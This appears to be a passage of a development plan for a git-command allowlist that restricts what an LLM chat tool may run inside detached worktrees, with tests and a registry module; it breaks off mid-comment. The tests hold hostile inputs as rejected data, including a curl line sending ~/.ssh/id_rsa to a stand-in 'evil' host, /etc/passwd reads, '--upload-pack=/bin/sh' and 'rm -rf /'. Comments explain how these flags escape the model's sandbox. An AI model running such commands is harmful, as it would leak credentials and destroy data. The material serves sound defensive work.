
- [ ] **Step 1: Write the failing tests**

```js
// test/ask-git-allowlist.test.mjs
// P4/T3: the single gate between the model's `git` argv and a spawn
// (ask-worca-worktrees-design.md §8) — allowlist matrix, --detach injection,
// fetch shape, global vetoes.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateGitArgs } from '../src/core/ask/git-allowlist.mjs';
import { ASK_LIMITS } from '../src/core/ask/limits.mjs';

const ok = (args) => { const v = validateGitArgs(args); assert.equal(v.ok, true, JSON.stringify(v)); return v; };
const no = (args, re) => { const v = validateGitArgs(args); assert.equal(v.ok, false, JSON.stringify(args)); if (re) assert.match(v.error, re); return v; };

test('read set passes verbatim (cat-file is NOT in the set — raw-content read)', () => {
  for (const args of [
    ['diff', 'origin/master...HEAD'], ['log', '--oneline', '-20'], ['show', 'HEAD~2'],
    ['status', '--short'], ['blame', 'src/app.js'], ['rev-parse', 'HEAD'],
    ['merge-base', 'master', 'HEAD'], ['grep', '-n', 'TODO'], ['shortlog', '-sn'],
    ['describe', '--tags'], ['ls-files'], ['ls-tree', 'HEAD', '--name-only'],
  ]) {
    const v = ok(args);
    assert.deepEqual(v.args, args);
    assert.equal(v.nav, false);
    assert.equal(v.fetch, false);
  }
  no(['cat-file', '-p', 'HEAD:README.md'], /allowlist/);        // raw blob read, removed from the read tier
});

test('worktree-scope escapes: no arbitrary-path read/exec, colour cannot defeat the filter', () => {
  no(['diff', '--no-index', '/dev/null', '/Users/x/.ssh/id_rsa'], /not allowed/);
  no(['diff', '--no-index=x'], /not allowed/);
  no(['blame', '--contents', '/etc/passwd', 'README.md'], /not allowed/);
  no(['grep', '-f', '/etc/passwd'], /not allowed/);
  no(['grep', '--file', '/etc/passwd'], /not allowed/);
  no(['diff', '--color=always', 'HEAD~1'], /not allowed/);
  no(['log', '--color', '-p'], /not allowed/);
  no(['grep', '-Ocurl http://evil/$(cat ~/.ssh/id_rsa)'], /not allowed/);   // short open-files-in-pager = exec
  no(['diff', '-O/etc/passwd'], /not allowed/);
  // the global blocklist must reject on its OWN, not only via a per-subcommand rule:
  no(['diff', '--upload-pack=/bin/sh'], /"--upload-pack=\/bin\/sh" is not allowed/);
  no(['log', '--receive-pack=x'], /"--receive-pack=x" is not allowed/);
});

test('argv is data, never a shell: metacharacters pass through as one literal token', () => {
  const v = ok(['log', '--grep', 'a; rm -rf / && $(whoami) `id` | cat']);
  assert.deepEqual(v.args, ['log', '--grep', 'a; rm -rf / && $(whoami) `id` | cat']);
});

test('branch/tag: list forms pass, creation and mutation forms are rejected', () => {
  ok(['branch']); ok(['branch', '--list']); ok(['branch', '-a']); ok(['branch', '--list', 'worca-cc/*']);
  ok(['branch', '--contains', 'HEAD']); ok(['tag', '--list']); ok(['tag']);
  no(['branch', 'new-branch'], /creates/);
  no(['branch', '-d', 'x'], /mutates/); no(['branch', '-D', 'x'], /mutates/);
  no(['branch', '-m', 'x'], /mutates/); no(['tag', 'v1'], /creates/);
  no(['tag', '-d', 'v1'], /mutates/);
});

test('checkout/switch: --detach injected, ref required, branch-creating and pathspec forms rejected', () => {
  assert.deepEqual(ok(['checkout', 'origin/master']).args, ['checkout', '--detach', 'origin/master']);
  assert.equal(ok(['checkout', 'origin/master']).nav, true);
  assert.deepEqual(ok(['switch', '--detach', 'abc1234']).args, ['switch', '--detach', 'abc1234']);
  no(['checkout', '-b', 'x', 'HEAD'], /not allowed/);
  no(['checkout', '-B', 'x'], /not allowed/);
  no(['switch', '-c', 'x'], /not allowed/);          // switch -c/-C create a branch (D4)
  no(['switch', '-C', 'x'], /not allowed/);
  no(['switch', '--orphan', 'x'], /not allowed/);
  no(['checkout', 'HEAD', '--', 'file.txt'], /not allowed/);
  no(['checkout'], /exactly one ref/);
  no(['checkout', 'a', 'b'], /exactly one ref/);
});

test('fetch: remote-name/--all/--prune only; URLs and refspecs rejected; pull/push/remote rejected with hints', () => {
  assert.equal(ok(['fetch']).fetch, true);
  ok(['fetch', 'origin']); ok(['fetch', '--all']); ok(['fetch', 'origin', '--prune']);
  no(['fetch', 'https://evil.example/repo.git'], /NAME only/);
  no(['fetch', 'git@host:repo.git'], /NAME only/);
  no(['fetch', 'origin', '+refs/heads/*:refs/heads/*'], /refspec/i);
  no(['fetch', 'origin', 'master:master'], /refspec/i);
  no(['fetch', '--upload-pack=/bin/sh'], /not allowed/);
  // exercise the FETCH_FLAGS veto loop on its OWN — --upload-pack is already caught
  // by BLOCKED_ANYWHERE, so without these the whole loop is dead-tested:
  no(['fetch', '--depth=1'], /not allowed/);
  no(['fetch', '--recurse-submodules'], /not allowed/);
  no(['fetch', '.'], /NAME only|path/);
  no(['fetch', '../other'], /NAME only|path/);
  no(['pull'], /fetch/);
  no(['push'], /propose a pipeline/i);
  no(['remote', '-v'], /propose a pipeline/i);
});

test('global vetoes at any position; unknown subcommands; non-array input', () => {
  for (const bad of [['diff', '-c', 'x=y'], ['log', '--git-dir=/etc'], ['-C', '/', 'log'],
    ['diff', '--ext-diff'], ['show', '--textconv'], ['log', '--output', '/tmp/x'],
    ['log', '-o', '/tmp/x'], ['diff', '--exec-path=/bin']]) no(bad, /not allowed/);
  no(['commit', '-m', 'x'], /allowlist/); no(['merge', 'x'], /allowlist/);
  no(['rebase'], /allowlist/); no(['reset', '--hard'], /allowlist/);
  no(['config', 'user.name'], /allowlist/); no(['stash'], /allowlist/);
  no(['submodule', 'update'], /allowlist/); no(['worktree', 'add', 'x'], /allowlist/);
  no([], /non-empty/); no('diff', /non-empty/); no([1], /non-empty/); no(['  '], /non-empty/);
});

test('caps live in ASK_LIMITS', () => {
  assert.equal(ASK_LIMITS.worktreesPerThread, 5);
  assert.equal(ASK_LIMITS.worktreesGlobal, 15);
  assert.equal(ASK_LIMITS.gitOutputMaxBytes, 200_000);
});
```

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-git-allowlist.test.mjs 2>&1 | tail -3`
Expected: FAIL — cannot find module `git-allowlist.mjs`.

- [ ] **Step 3: Implement the validator**

```js
// src/core/ask/git-allowlist.mjs
// The single gate between the Ask Worca `git` tool and a spawned git argv
// (ask-worca-worktrees-design.md §8). Pure, no imports: worktree-deps.mjs
// spawns ONLY what this returns. Allowlist-shaped throughout — unknown
// subcommands, creation/mutation forms and the known exec/config/write/
// transport vectors are rejected with a hint the model can act on.

// `cat-file` is DELIBERATELY absent: it is a pure raw-content read (`cat-file -p
// HEAD:.env` / `cat-file -p <blob-sha>`) with no diff structure for the §8
// protected-path filter to act on, and it completes the `ls-tree -> blob-sha ->
// cat-file -p <sha>` leak that no path inspection can catch (a sha carries no
// path). Files are read by checking out the ref and using native Read inside the
// worktree — the git tool serves diffs/logs/history, not raw file dumps.
const READ_SUBCOMMANDS = new Set([
  'diff', 'log', 'show', 'status', 'blame', 'rev-parse', 'merge-base',
  'grep', 'shortlog', 'describe', 'ls-files', 'ls-tree',
]);
const LIST_ONLY = new Set(['branch', 'tag']);
const NAV = new Set(['checkout', 'switch']);

// ANY position, exact token or `=`-form prefix. Closes config injection
// (`-c`/`--config-env` → hooks/pager/textconv = arbitrary exec), repo
// redirection (`--git-dir`/`--work-tree`/`-C`), exec paths (`--exec-path`/
// `--ext-diff`/`--textconv`), file writes (`--output`/`-o`) and transport
// command overrides (`--upload-pack`/`--receive-pack`).
//
// The second row are worktree-scope ESCAPES demonstrated during planning (spec
// D3 — the model reads ONLY inside its checkout): `diff --no-index <a> <b>` and
// `blame --contents <file>` read ARBITRARY filesystem paths and print them,
// bypassing the Read/Grep/Glob permission scoping AND every §7 deny; `grep
// -f/--file <path>` reads a pattern file from anywhere; `--filters` runs a
// repo-configured smudge filter (arbitrary exec — cat-file is already removed
// from the read tier, but blocking the flag is defence-in-depth); `--color`/
// `--color=*` injects SGR escapes that make the `diff --git ` header undetectable, defeating
// the protected-path section filter (verified: `git diff --color=always` leaked
// a whole `.env`). `-f`/`--file` are already in BRANCH_TAG_MUTATING/NAV_BLOCKED,
// so promoting them here changes no existing behaviour. The short `-O` form of
// `--open-files-in-pager` (arbitrary exec) needs a PREFIX guard, not a Set entry
// — `key('-Ocurl…')` returns the whole token, so no exact match can catch it
// (handled in validateGitArgs below).
const BLOCKED_ANYWHERE = new Set([
  '-c', '--config-env', '--exec-path', '--git-dir', '--work-tree', '-C',
  '--ext-diff', '--textconv', '--output', '-o', '--upload-pack', '--receive-pack',
  '--open-files-in-pager',
  '--no-index', '--contents', '-f', '--file', '--filters', '--color',
]);

const BRANCH_TAG_MUTATING = new Set([
  '-d', '-D', '--delete', '-m', '-M', '--move', '-c', '-C', '--copy', '-f', '--force',
  '--edit-description', '--set-upstream-to', '-u', '--unset-upstream', '--create-reflog',
  '-s', '--sign', '-F', '--file', '-e', '--edit', '-a', // tag -a creates; branch -a lists — resolved below
]);
const LISTY_FLAGS = new Set(['--list', '-l', '--contains', '--no-contains', '--merged', '--no-merged', '--points-at']);
// `-c`/`-C`/`--guess` create a branch on `switch`; without them a `git switch -c
// evil` is blocked only by git's own `--detach`+`-c` mutual-exclusion error — a
// version-dependent accident, not the validator. Blocking them keeps D4 ("no
// branch ever created") enforced by us, not by git's argument parser.
const NAV_BLOCKED = new Set(['-b', '-B', '-c', '-C', '--guess', '--orphan', '--track', '-t', '-f', '--force',
  '--ours', '--theirs', '-p', '--patch', '--pathspec-from-file', '--merge', '-m']);
const FETCH_FLAGS = new Set(['--all', '--prune', '-p']);

const key = (a) => (a.includes('=') ? a.slice(0, a.indexOf('=')) : a);

function validateListOnly(sub, args) {
  const rest = args.slice(1);
  for (const a of rest) {
    const k = key(a);
    if (k === '-a' && sub === 'branch') continue;              // branch -a = list all; tag -a = create
    if (BRANCH_TAG_MUTATING.has(k)) return { ok: false, error: `git ${sub} ${a} mutates branches/tags and is not allowed` };
  }
  const positionals = rest.filter((a) => !a.startsWith('-'));
  const listy = rest.some((a) => LISTY_FLAGS.has(key(a)));
  if (positionals.length && !listy) {
    return { ok: false, error: `git ${sub} with a positional name creates a ${sub}; use --list <pattern> to filter` };
  }
  return { ok: true, args, nav: false, fetch: false };
}

function validateNav(sub, args) {
  const rest = args.slice(1);
  if (rest.includes('--')) return { ok: false, error: `git ${sub} -- <paths> (file restore) is not allowed` };
  for (const a of rest) {
    if (NAV_BLOCKED.has(key(a))) return { ok: false, error: `git ${sub} ${a} is not allowed (worktrees stay detached, files stay pristine)` };
  }
  const positionals = rest.filter((a) => !a.startsWith('-'));
  if (positionals.length !== 1) return { ok: false, error: `git ${sub} needs exactly one ref` };
  const out = rest.includes('--detach') ? args : [sub, '--detach', ...rest];
  return { ok: true, args: out, nav: true, fetch: false };
}

function validateFetch(args) {
  const rest = args.slice(1);
  for (const a of rest.filter((x) => x.startsWith('-'))) {
    if (!FETCH_FLAGS.has(a)) return { ok: false, error: `git fetch ${a} is not allowed` };
  }
  const positionals = rest.filter((a) => !a.startsWith('-'));
  if (positionals.length > 1) return { ok: false, error: 'git fetch takes at most a remote name — refspecs are not allowed (they can rewrite local branches)' };
  if (positionals.length === 1) {
    const p = positionals[0];
    // Remote NAME only. Reject URLs/refspecs (`:`), path traversal (`.`/`..` or a
    // leading `.`), and a leading `-` (option-shaped). The runtime `git remote`
    // membership check in the tool handler is the second gate, but shape-reject here.
    if (!/^[A-Za-z0-9._-]+$/.test(p) || p.includes(':') || p === '.' || p === '..' || /^[.-]/.test(p)) {
      return { ok: false, error: 'git fetch accepts a configured remote NAME only, never a URL, refspec or path' };
    }
  }
  return { ok: true, args, nav: false, fetch: true };
}

/**
 * @param {unknown} rawArgs  the model-supplied argv (without the leading "git")
 * @returns {{ok:true, args:string[], nav:boolean, fetch:boolean} | {ok:false, error:string}}
 */
export function validateGitArgs(rawArgs) {
  if (!Array.isArray(rawArgs) || !rawArgs.length || !rawArgs.every((a) => typeof a === 'string')) {
    return { ok: false, error: 'args must be a non-empty array of strings' };
  }
  const args = rawArgs.map((a) => a.trim()).filter((a) => a.length);
  if (!args.length) return { ok: false, error: 'args must be a non-empty array of strings' };
  for (const a of args) {
    // Prefix guard for the short `-O<cmd>` (open-files-in-pager = arbitrary exec):
    // its value is attached, so key() cannot normalise it to a Set-matchable token.
    // Also catches the `diff -O<orderfile>` file-read variant.
    if (/^-O./.test(a) || a === '-O') return { ok: false, error: `argument ${JSON.stringify(a)} is not allowed` };
    if (BLOCKED_ANYWHERE.has(key(a))) return { ok: false, error: `argument ${JSON.stringify(a)} is not allowed` };
  }
  const sub = args[0];
  if (sub === 'pull') return { ok: false, error: 'pull is not available (detached worktrees have nothing to merge into) — fetch, then diff/checkout origin/<branch>' };
  if (sub === 'push' || sub === 'remote') return { ok: false, error: `${sub} is not available: the chat cannot publish anything — propose a pipeline instead` };
  if (READ_SUBCOMMANDS.has(sub)) return { ok: true, args, nav: false, fetch: false };
  if (LIST_ONLY.has(sub)) return validateListOnly(sub, args);
  if (NAV.has(sub)) return validateNav(sub, args);
  if (sub === 'fetch') return validateFetch(args);
  return { ok: false, error: `git ${sub} is not in the allowlist` };
}
```

In `src/core/ask/limits.mjs`, inside the `ASK_LIMITS` literal (after `diffMaxBytes: 200_000,`):

```js
  gitOutputMaxBytes: 200_000,              // per `git` tool call (P4 §8), sliceBytes window
  worktreesPerThread: 5,                   // P4 D9
  worktreesGlobal: 15,                     // P4 D9
```

- [ ] **Step 4: Run tests**

Run: `node --test test/ask-git-allowlist.test.mjs test/ask-limits.test.mjs 2>&1 | tail -3`
Expected: PASS. (`test/ask-limits.test.mjs` does NOT pin the `ASK_LIMITS` key set — verified: it asserts individual values plus a `deepEqual` on `ASK_LIMITS.attachment` only — so the three new keys need no test edit. `gitOutputMaxBytes` is wired into the `git` handler in Task 5; keep it here.)

- [ ] **Step 5: Commit**

```bash
git add src/core/ask/git-allowlist.mjs src/core/ask/limits.mjs test/ask-git-allowlist.test.mjs
git commit -m "worca: Ask Worca Worktrees — git argv allowlist + caps"
```
(`test/ask-limits.test.mjs` is intentionally NOT staged — it needs no edit.)

---

### Task 4: `ask/worktrees.mjs` — registry, lifecycle, sweep

**Files:**
- Create: `src/core/ask/worktrees.mjs`
- Test: `test/ask-worktrees.test.mjs` (create)

**Interfaces:**
- Consumes: `createDetachedWorktree, removeWorktree, worktreeHead, isValidSourceRef` (Task 2), `ASK_LIMITS` caps (Task 3), `ASK_ID_RE, askRoot` from `./store.mjs`, `readStoreMeta, findPipelineRowById` from `../artifacts.mjs` (`readStoreMeta(key)?.path` is the projectDir — see `artifacts.mjs:1690-1691`), `branchExists` from `../git-info.mjs`, `listProjects` from `../projects.mjs`.
- Produces (exact exports later tasks import):
  - `WT_ID_RE` (`/^wt_[0-9a-f]{8}$/`), `class AskWorktreeError`
  - `worktreesDir(threadId)`, `worktreeDirFor(threadId, wtId)` (both throw on unminted ids)
  - `listAskWorktrees(threadId) → Array<{worktreeId, threadId, projectKey, projectDir, ref, commit, runId, path, createdAt, updatedAt}>`
  - `getAskWorktree(threadId, wtId) → row|null`
  - `openAskWorktree({threadId, projectKey?, ref?, runId?, signal?}) → Promise<row>` (throws `AskWorktreeError`)
  - `removeAskWorktree({threadId, wtId}) → Promise<{ok:true, steps}>` (throws `AskWorktreeError` when not found)
  - `removeThreadWorktrees(threadId) → Promise<{removed:number}>` (never throws)
  - `noteWorktreeNavigation(threadId, wtId, {ref}) → Promise<row|null>`
  - `sweepAskWorktrees({log?}) → Promise<{removedDirs, prunedRows, failed}>`

- [ ] **Step 1: Write the failing tests**

```js
// test/ask-worktrees.test.mjs
// P4/T4: the per-thread worktree registry (ask-worca-worktrees-design.md §3-§5)
// — open/list/remove over a real repo, caps, run-id sugar, navigation row
// updates, the sweep, and the unminted-id doctrine.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { existsSync, rmSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { useTempHome } from './helpers/temp-home.mjs';
import { seedPipeline, seedWorkspacePipeline } from './helpers/db-seed.mjs';
import { addProject } from '../src/core/projects.mjs';
import { createThread, deleteThread } from '../src/core/ask/store.mjs';
import { prepare, getDb, _resetForTests } from '../src/core/db.mjs';
import { ASK_LIMITS } from '../src/core/ask/limits.mjs';
import {
  openAskWorktree, listAskWorktrees, getAskWorktree, removeAskWorktree,
  removeThreadWorktrees, noteWorktreeNavigation, sweepAskWorktrees,
  worktreesDir, worktreeDirFor, AskWorktreeError, WT_ID_RE,
} from '../src/core/ask/worktrees.mjs';

useTempHome(after);

const created = [];
after(() => Promise.all(created.map((d) => rm(d, { recursive: true, force: true }))));
async function freshRepo() {
  const dir = await mkdtemp(join(tmpdir(), 'worca-cc-awt-'));
  created.push(dir);
  const g = (args) => spawnSync('git', args, { cwd: dir });
  g(['init', '-q', '-b', 'main']);
  g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  await writeFile(join(dir, 'README.md'), '# hi\n');
  g(['add', '-A']); g(['commit', '-qm', 'init']);
  g(['checkout', '-qb', 'worca-cc/feat-00000001']);
  await writeFile(join(dir, 'feat.txt'), 'F\n');
  g(['add', '-A']); g(['commit', '-qm', 'feat']);
  g(['checkout', '-q', 'main']);
  return dir;
}

test('open/list/get/remove round trip; row shape; detached checkout on disk', async () => {
  const repo = await freshRepo();
  // addProject returns listProjects() — an ARRAY, not the row; pick the entry.
  const p = (await addProject({ name: 'awt-one', path: repo })).find((x) => x.name === 'awt-one');
  const t = createThread();
  const wt = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  assert.match(wt.worktreeId, WT_ID_RE);
  assert.equal(wt.projectKey, p.key);
  assert.equal(wt.ref, 'main');
  assert.match(wt.commit, /^[0-9a-f]{40}$/);
  assert.ok(wt.path.startsWith(worktreesDir(t.id)), 'placed under <askRoot>/<tid>/wt');
  assert.ok(existsSync(join(wt.path, 'README.md')));
  assert.deepEqual(listAskWorktrees(t.id).map((w) => w.worktreeId), [wt.worktreeId]);
  assert.equal(getAskWorktree(t.id, wt.worktreeId).path, wt.path);
  const out = await removeAskWorktree({ threadId: t.id, wtId: wt.worktreeId });
  assert.equal(out.ok, true);
  assert.ok(!existsSync(wt.path));
  assert.deepEqual(listAskWorktrees(t.id), []);
  await assert.rejects(() => removeAskWorktree({ threadId: t.id, wtId: wt.worktreeId }), AskWorktreeError);
});

test('errors: unknown thread, unknown project, bad ref, both-or-neither target, non-repo dir', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-err', path: repo })).find((x) => x.name === 'awt-err');
  const t = createThread();
  await assert.rejects(() => openAskWorktree({ threadId: 'ask_ffffffff', projectKey: p.key, ref: 'main' }), /unknown thread/);
  await assert.rejects(() => openAskWorktree({ threadId: t.id, projectKey: 'nope-00000000', ref: 'main' }), /unknown projectKey/);
  await assert.rejects(() => openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'no-such' }), /does not resolve/);
  await assert.rejects(() => openAskWorktree({ threadId: t.id, projectKey: p.key, ref: '--force' }), /does not resolve/);
  await assert.rejects(() => openAskWorktree({ threadId: t.id }), /give \(projectKey and ref\) or runId/);
  assert.throws(() => worktreesDir('..'), /never minted/);
  assert.throws(() => worktreeDirFor(t.id, '../etc'), /never minted/);
  // a registered project whose dir is NOT a git repo (pins the .git check — it
  // survived mutation without this assertion):
  const plain = await mkdtemp(join(tmpdir(), 'worca-cc-awt-plain-'));
  created.push(plain);
  const np = (await addProject({ name: 'awt-nogit', path: plain })).find((x) => x.name === 'awt-nogit');
  await assert.rejects(() => openAskWorktree({ threadId: t.id, projectKey: np.key, ref: 'main' }), /has no git repository/);
});

test('caps: 6th per-thread and 16th global are refused with actionable errors', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-cap', path: repo })).find((x) => x.name === 'awt-cap');
  const t = createThread();
  for (let i = 0; i < ASK_LIMITS.worktreesPerThread; i++) {
    await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  }
  await assert.rejects(() => openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' }), /cap reached \(5 per chat\)/);
  // global: fill the remaining 10 slots across other threads, then refuse the 16th
  const others = [];
  for (let i = 0; i < ASK_LIMITS.worktreesGlobal - ASK_LIMITS.worktreesPerThread; i++) {
    const tt = createThread(); others.push(tt);
    await openAskWorktree({ threadId: tt.id, projectKey: p.key, ref: 'main' });
  }
  const t2 = createThread();
  await assert.rejects(() => openAskWorktree({ threadId: t2.id, projectKey: p.key, ref: 'main' }), /global worktree cap/);
  // MUST release the global cap: node:test runs a file's top-level tests in order,
  // so 15 leaked rows fail every later test in this file with "global cap reached".
  await removeThreadWorktrees(t.id);
  for (const tt of others) await removeThreadWorktrees(tt.id);
});

test('run-id sugar: single-project run resolves the feature branch; deleted branch errors with the diff hint', async () => {
  const repo = await freshRepo();
  (await addProject({ name: 'awt-run', path: repo }));            // registers + writes store_meta
  const t = createThread();
  // seedPipeline(projectDir, state) is POSITIONAL and MINTS its own id
  // (db-seed.mjs: callers MUST use the returned {id}, never a hardcoded one).
  const run = await seedPipeline(repo, { status: 'done',
    branch: { source: 'main', feature: 'worca-cc/feat-00000001' } });
  const wt = await openAskWorktree({ threadId: t.id, runId: run.id });
  assert.equal(wt.ref, 'worca-cc/feat-00000001');
  assert.equal(wt.runId, run.id);
  assert.ok(existsSync(join(wt.path, 'feat.txt')));
  spawnSync('git', ['branch', '-D', 'worca-cc/feat-00000001'], { cwd: repo });
  await assert.rejects(() => openAskWorktree({ threadId: t.id, runId: run.id }), /no longer exists.*get_run_diff/);
  await assert.rejects(() => openAskWorktree({ threadId: t.id, runId: 'ffffffff' }), /run not found/);
});

test('run-id sugar: workspace run needs projectKey and resolves the member branch', async () => {
  const repoA = await freshRepo();
  const repoB = await freshRepo();
  const t = createThread();
  // seedWorkspacePipeline(primaryDir, workspaceKey, state, projects) is POSITIONAL
  // and mints its id. The members/branches the impl reads come from `state`
  // (workspace_meta.projects / .branches); the 4th arg only seeds store_meta, and
  // its second writeState re-serializes workspace_meta FROM state, so `projects`
  // must be repeated inside state or meta.projects persists as [] ("one of: none").
  const members = [
    { projectKey: 'alpha-00000001', projectDir: repoA, projectName: 'alpha' },
    { projectKey: 'beta-00000002',  projectDir: repoB, projectName: 'beta'  },
  ];
  const run = await seedWorkspacePipeline(repoA, 'wks-demo-00000001', {
    status: 'done',
    projects: members,                                 // -> workspace_meta.projects
    projectKeys: members.map((m) => m.projectKey),
    branches: {                                         // -> workspace_meta.branches
      'alpha-00000001': { source: 'main', feature: 'worca-cc/feat-00000001' },
      'beta-00000002':  { source: 'main', feature: 'worca-cc/feat-00000001' },
    },
  }, members);
  await assert.rejects(() => openAskWorktree({ threadId: t.id, runId: run.id }), /workspace run.*alpha-00000001.*beta-00000002/s);
  const wt = await openAskWorktree({ threadId: t.id, runId: run.id, projectKey: 'beta-00000002' });
  assert.equal(wt.projectDir, repoB);                  // row.project_dir stored VERBATIM (not realpath'd)
  assert.equal(wt.ref, 'worca-cc/feat-00000001');
  // §5 step 3 (deleted-branch) applies to workspace members too — pins A8.
  spawnSync('git', ['branch', '-D', 'worca-cc/feat-00000001'], { cwd: repoB });
  await assert.rejects(() => openAskWorktree({ threadId: t.id, runId: run.id, projectKey: 'beta-00000002' }),
    /no longer exists.*get_run_diff/);
});

test('navigation note updates ref + commit; thread delete removes checkouts, rows and git registrations', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-nav', path: repo })).find((x) => x.name === 'awt-nav');
  const t = createThread();
  const wt = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  spawnSync('git', ['checkout', '-q', '--detach', 'worca-cc/feat-00000001'], { cwd: wt.path });
  const upd = await noteWorktreeNavigation(t.id, wt.worktreeId, { ref: 'worca-cc/feat-00000001' });
  assert.equal(upd.ref, 'worca-cc/feat-00000001');
  assert.notEqual(upd.commit, wt.commit);
  await removeThreadWorktrees(t.id);
  deleteThread(t.id);
  assert.ok(!existsSync(wt.path));
  // SCOPE the count by thread_id — other tests in this file leave rows, so an
  // unscoped `count(*)` fails on residue (2 !== 0). (This asserts the
  // removeThreadWorktrees+deleteThread teardown, NOT the FK — the FK gets its own
  // test below, because removeThreadWorktrees already emptied the rows here.)
  assert.equal(prepare('SELECT count(*) AS n FROM ask_worktrees WHERE thread_id = ?').get(t.id).n, 0, 'rows gone after teardown');
  assert.ok(!String(spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: repo }).stdout).includes('/wt/'), 'no stale registration');
});

test('cascade: deleting the ask_threads row ALONE reaps its ask_worktrees rows (FK, not bookkeeping)', async () => {
  // Pins ON DELETE CASCADE. The nav test above deletes rows via removeThreadWorktrees
  // FIRST, so dropping the FK survives there; this deletes the thread row directly.
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-casc', path: repo })).find((x) => x.name === 'awt-casc');
  const t = createThread();
  const wt = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  assert.deepEqual(listAskWorktrees(t.id).map((w) => w.worktreeId), [wt.worktreeId]);
  getDb().prepare('DELETE FROM ask_threads WHERE id = ?').run(t.id);   // no removeThreadWorktrees
  assert.deepEqual(listAskWorktrees(t.id), [], 'ON DELETE CASCADE reaped the registry rows');
  // The row is gone but the checkout dir survives on disk — remove it so the sweep
  // test below (shared temp home, scans <askRoot>/*/wt/*) does not count it as an
  // extra orphan and see `removedDirs 2 !== 1`.
  rmSync(wt.path, { recursive: true, force: true });
});

test('sweep: orphan dir removed, stale row dropped+git-pruned, both reported', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-sweep', path: repo })).find((x) => x.name === 'awt-sweep');
  const t = createThread();
  const a = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  const b = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  rmSync(a.path, { recursive: true, force: true });                       // stale row (dir gone)
  getDb();
  prepare('DELETE FROM ask_worktrees WHERE id = ?').run(b.worktreeId);    // orphan dir (row gone)
  const reg = () => String(spawnSync('git', ['worktree', 'list', '--porcelain'], { cwd: repo }).stdout);
  assert.ok(reg().includes(a.worktreeId), 'precondition: git still holds the stale registration');
  const r = await sweepAskWorktrees({ log: () => {} });
  assert.equal(r.prunedRows, 1);
  assert.equal(r.removedDirs, 1);
  assert.equal(r.failed, 0);
  assert.deepEqual(listAskWorktrees(t.id), []);
  assert.ok(!existsSync(b.path));
  // the stale row must be git-PRUNED in project_dir, not merely row-deleted
  // (dropping removeWorktree from the stale-row path survives without this):
  assert.ok(!reg().includes(a.worktreeId), 'the stale registration was pruned');
});

// MUST be the LAST test in this file: it DROPs ask_worktrees to make the row scan
// throw, then heals via _resetForTests + getDb. Pins the three-state doctrine
// (the plan calls it safety-critical yet the v1 shipped zero coverage — the
// `summary.failed += 1` on the row-scan catch SURVIVED mutation).
test('sweep: an unreadable registry skips everything — never guess-delete (three-state doctrine)', async () => {
  const repo = await freshRepo();
  const p = (await addProject({ name: 'awt-throw', path: repo })).find((x) => x.name === 'awt-throw');
  const t = createThread();
  const wt = await openAskWorktree({ threadId: t.id, projectKey: p.key, ref: 'main' });
  getDb().exec('DROP TABLE ask_worktrees');                 // the row lookup itself now THROWS
  const logged = [];
  const r = await sweepAskWorktrees({ log: (lvl, msg) => logged.push(`${lvl}:${msg}`) });
  assert.equal(r.failed, 1, 'the failure is counted, not swallowed');
  assert.equal(r.removedDirs, 0, 'a DB failure must NOT read as "no rows => reclaim everything"');
  assert.equal(r.prunedRows, 0);
  assert.ok(existsSync(wt.path), 'the live checkout survived the unreadable registry');
  assert.ok(logged.some((l) => l.startsWith('warn:')), 'reported in the sweep summary');
  _resetForTests();                                        // reopen heals the dropped table
  getDb();
});
```

NOTE — real helper signatures (empirically resolved; the v1 NOTE's guesses were all wrong, and the calls above already reflect these):
- `addProject(input)` returns **`listProjects()` — the whole ARRAY**, not the row (`projects.mjs:143`). Pick the entry: `(await addProject({ name, path: repo })).find((x) => x.name === name)`. The `const [p] = await addProject(...)` idiom (`ask-tools.test.mjs:610`) is order-fragile (`ORDER BY created_at, name`, ms ties) once a file registers >1 project — and these files do — so `.find` by name.
- `seedPipeline(projectDir, state = {})` → `{id, dir, key}` — **positional, and the id is MINTED** (`db-seed.mjs`: callers MUST use the returned `{id}`, never a literal). `branch: {source, feature}` is the right shape.
- `seedWorkspacePipeline(primaryDir, workspaceKey, state = {}, projects)` → `{id, dir}` — four positionals; the members/branches the impl reads come from **`state`** (`workspace_meta.projects` / `.branches`), and its second `writeState` re-serializes `workspace_meta` FROM `state`, so `projects` must ALSO appear inside `state` or `meta.projects` persists as `[]`.
- `seedPipeline` DOES write `store_meta` (`createPipeline → ensureArtifactDirs → ensureMeta → writeStoreMeta(key, 'project', {key, path: canonicalProjectRoot(dir), …})`), which is exactly the `readStoreMeta(row.project_key)?.path` the impl reads — so **no `writeStoreMeta`/`seedPipelineRow` fallback is needed**.
- Adjust the CALLS to these signatures, never the assertions (only literal ids → the minted `run.id`). `freshStore`'s `proj-00000001` pitfall does NOT apply (these mint real keys), and the `workspaceStorePath(null)` pitfall does not bite (`workspaceKey` is always passed).

- [ ] **Step 2: Run to verify failure**

Run: `node --test test/ask-worktrees.test.mjs 2>&1 | tail -3`
Expected: FAIL — cannot find module `worktrees.mjs`.

- [ ] **Step 3: Implement the module**

```js
// src/core/ask/worktrees.mjs
// Per-thread detached git worktrees of the Ask Worca chat
// (ask-worca-worktrees-design.md §3-§5): registry rows in ask_worktrees,
// checkouts under <worcaHome>/ask/<threadId>/wt/<wtId>. Git mechanics come from
// ../worktree.mjs (DB-free primitives); this module owns rows, paths, caps and
